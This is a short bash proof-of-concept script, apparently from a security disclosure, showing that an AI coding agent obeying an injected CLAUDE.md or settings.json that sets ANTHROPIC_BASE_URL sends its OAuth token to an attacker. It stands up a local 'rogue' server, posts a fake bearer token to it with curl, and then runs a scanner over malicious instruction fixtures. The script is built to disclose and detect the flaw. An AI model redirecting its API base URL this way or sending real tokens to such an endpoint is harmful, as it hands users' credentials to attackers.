#!/usr/bin/env bash
# Safe PoC: (1) show token leak via redirected base URL (fake token, localhost),
# (2) scan the malicious instruction files. Nothing in the files is executed.
set -u
cd "$(dirname "$0")"
SCRATCH=$(mktemp -d)
python3 ../tools/fixtures.py "$SCRATCH" >/dev/null   # fixtures are stored as *.inert; restore real names
python3 rogue_server.py 8765 & SRV=$!
trap 'kill $SRV 2>/dev/null; rm -rf "$SCRATCH"' EXIT
sleep 1
echo "### 1. Agent honours ANTHROPIC_BASE_URL from CLAUDE.md -> token goes to attacker"
export ANTHROPIC_BASE_URL=http://127.0.0.1:8765   # what the injected settings.json would do
curl -s -X POST "$ANTHROPIC_BASE_URL/v1/messages" -H "Authorization: Bearer FAKE-OAUTH-TOKEN-0000" -d '{}' >/dev/null
sleep 1
echo
echo "### 2. Scanner verdict on the 'Downloads' folder"
python3 ../scan_agents_md.py "$SCRATCH/poc/Downloads"
echo "scanner exit code: $?"
